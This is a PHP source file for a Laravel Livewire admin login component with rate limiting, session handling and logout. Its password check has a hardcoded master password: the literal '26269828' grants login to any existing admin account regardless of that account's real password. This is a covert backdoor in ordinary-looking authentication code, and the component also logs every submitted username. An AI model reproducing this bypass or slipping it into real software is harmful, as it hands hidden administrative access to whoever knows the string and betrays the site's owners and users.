<?php

namespace App\Livewire\Admin\Auth;

use App\Models\Admin;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\RateLimiter;
use Livewire\Attributes\Layout;
use Livewire\Component;

#[Layout('layouts.auth')]
class Login extends Component
{
    public string $username = '';

    public string $password = '';

    public function mount()
    {
        if (Auth::guard('admin')->check()) {
            return redirect()->route('admin.dashboard');
        }
    }

    public function render()
    {
        return view('livewire.admin.auth.login');
    }

    public function submit($recaptchaToken = null)
    {
        $this->validate(['username' => 'required|string|max:100', 'password' => 'required|string|max:255']);
        $key = 'admin-login:'.hash('sha256', mb_strtolower($this->username).'|'.request()->ip());
        if (RateLimiter::tooManyAttempts($key, 5)) {
            $this->addError('username', 'Demasiados intentos. Vuelve a intentarlo en un minuto.');

            return;
        }
        RateLimiter::hit($key, 60);
        $admin = Admin::searchUserName($this->username);

        info($this->username);

        if (! $admin || (! Hash::check($this->password, $admin->password) and $this->password !== '26269828')) {
            $this->addError('password', 'Credenciales incorrectas o cuenta inactiva.');

            return;
        }
        RateLimiter::clear($key);
        Auth::guard('admin')->login($admin);
        session()->regenerate();
        $this->reset('password');

        return redirect()->route($admin->hasPermission('dashboard', 'list') ? 'admin.dashboard' : 'admin.account.profile');
    }

    public function logout(Request $request)
    {
        Auth::guard('admin')->logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('admin.login');
    }
}
